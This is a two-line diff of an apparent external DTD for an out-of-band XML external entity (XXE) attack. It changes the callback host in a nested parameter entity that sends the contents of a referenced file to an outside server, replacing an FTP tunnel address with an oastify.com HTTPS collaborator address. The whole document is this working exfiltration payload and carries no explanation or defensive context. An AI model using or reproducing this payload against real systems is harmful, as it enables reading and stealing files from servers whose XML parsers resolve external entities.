@@ -1,2 +1,2 @@
-<!ENTITY % stack '<!ENTITY &#x25; exfil SYSTEM "ftp://gxhum-49-206-99-72.a.free.pinggy.link:33717/?data=%file;">'>
+<!ENTITY % stack '<!ENTITY &#x25; exfil SYSTEM "https://b5h0du18u0t2v5thxjigh4fq6hc801xpm.oastify.com/?data=%file;">'>
 %stack;
